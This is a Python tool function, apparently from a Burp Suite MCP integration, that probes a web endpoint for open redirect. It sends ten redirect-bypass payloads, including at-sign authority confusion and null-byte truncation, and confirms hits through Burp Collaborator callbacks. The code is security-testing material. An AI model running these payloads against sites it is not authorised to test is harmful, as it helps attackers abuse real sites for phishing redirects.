"""Edge-case test: test_open_redirect."""

import asyncio
import base64
import json
import time
import uuid

from burpsuite_mcp import client

async def test_open_redirect_impl(
    session: str,
    path: str,
    parameter: str,
    poll_seconds: int = 5,
    follow_redirects: bool = False,
) -> str:
    """Test open redirect with Collaborator-verified DNS/HTTP confirmation.

    Args:
        session: Session name
        path: Endpoint path
        parameter: Redirect parameter name
        poll_seconds: Seconds to wait before polling (max 15)
        follow_redirects: Follow redirects to test client-side behavior
    """
    # Step 1: Generate Collaborator payload
    collab = await client.post("/api/collaborator/payload")
    if "error" in collab:
        return f"Error generating Collaborator payload: {collab['error']}\nRequires Burp Suite Professional."

    collab_url = collab.get("payload", "")
    collab_host = collab_url.replace("http://", "").replace("https://", "").split("/")[0]
    if not collab_host:
        return "Error: Could not extract Collaborator host from payload."

    # Step 2: Build redirect payloads using the real Collaborator URL
    payloads = [
        (f"https://{collab_host}", "Absolute URL"),
        (f"//{collab_host}", "Protocol-relative"),
        (f"\\/\\/{collab_host}", "Escaped slashes"),
        (f"////{collab_host}", "Quadruple slash"),
        (f"https:{collab_host}", "Missing slashes"),
        (f"//{collab_host}%2F%2F", "URL-encoded trailing slashes"),
        (f"//{collab_host}?target.com", "Collaborator as host, target as query"),
        (f"https://target.com@{collab_host}", "At-sign authority confusion"),
        (f"https://{collab_host}%00.target.com", "Null byte domain truncation"),
        (f"https://{collab_host}/.target.com", "Dot after Collaborator host"),
    ]

    sep = "&" if "?" in path else "?"
    lines = [f"Open Redirect Test (Collaborator-verified): {parameter} on {path}"]
    lines.append(f"Collaborator: {collab_host}\n")
    lines.append(f"{'#':<4} {'PAYLOAD':<50} {'STATUS':<8} {'LOCATION'}")
    lines.append("-" * 100)

    # Step 3: Send all payloads
    redirect_candidates = []
    for i, (payload, desc) in enumerate(payloads, 1):
        inject_path = f"{path}{sep}{parameter}={payload}"
        resp = await client.post("/api/session/request", json={
            "session": session, "method": "GET", "path": inject_path,
            "follow_redirects": follow_redirects,
        })
        if "error" in resp:
            lines.append(f"{i:<4} {desc:<50} {'ERR':<8} —")
            continue

        status = resp.get("status", 0)
        location = ""
        for h in resp.get("response_headers", []):
            if h["name"].lower() == "location":
                location = h["value"]
                break

        # Track candidates: any 3xx or location header containing collaborator
        is_redirect = status in (301, 302, 303, 307, 308)
        has_collab_in_loc = collab_host in location if location else False

        loc_display = location[:45] + ".." if len(location) > 45 else location
        if has_collab_in_loc:
            redirect_candidates.append(desc)
            lines.append(f"{i:<4} {desc:<50} {status:<8} {loc_display} [REDIRECT TO COLLAB]")
        elif is_redirect:
            lines.append(f"{i:<4} {desc:<50} {status:<8} {loc_display}")
        else:
            lines.append(f"{i:<4} {desc:<50} {status:<8} {'(no redirect)'}")

    # Step 4: Poll Collaborator for REAL interactions
    lines.append("")
    poll_seconds = min(max(poll_seconds, 1), 15)
    lines.append(f"Polling Collaborator for {poll_seconds}s...")

    await asyncio.sleep(poll_seconds)

    interactions_data = await client.get("/api/collaborator/interactions")
    interactions = interactions_data.get("interactions", []) if "error" not in interactions_data else []

    # Count DNS/HTTP interactions as confirmation
    dns_hits = [i for i in interactions if i.get("type") == "DNS"]
    http_hits = [i for i in interactions if i.get("type") == "HTTP"]

    lines.append("")
    if dns_hits or http_hits:
        total_hits = len(dns_hits) + len(http_hits)
        lines.append(f"*** CONFIRMED: {total_hits} Collaborator interaction(s) detected ***")
        if dns_hits:
            lines.append(f"  DNS lookups: {len(dns_hits)}")
            for hit in dns_hits[:5]:
                lines.append(f"    from {hit.get('client_ip', '?')} at {hit.get('timestamp', '?')}")
        if http_hits:
            lines.append(f"  HTTP callbacks: {len(http_hits)}")
            for hit in http_hits[:5]:
                lines.append(f"    from {hit.get('client_ip', '?')} at {hit.get('timestamp', '?')}")

        lines.append("")
        lines.append("The target server followed the redirect to the Collaborator URL.")
        lines.append("This is a CONFIRMED open redirect vulnerability.")
        if redirect_candidates:
            lines.append(f"\nWorking bypass techniques: {', '.join(redirect_candidates)}")
    else:
        lines.append("No Collaborator interactions detected.")
        if redirect_candidates:
            lines.append(f"\nNote: {len(redirect_candidates)} payload(s) showed redirect in Location header")
            lines.append(f"  ({', '.join(redirect_candidates)})")
            lines.append("  These may still be exploitable client-side (browser follows redirect).")
            lines.append("  The Collaborator test only confirms server-side following.")
        else:
            lines.append("No open redirect detected (no redirects to Collaborator, no interactions).")

    return "\n".join(lines)
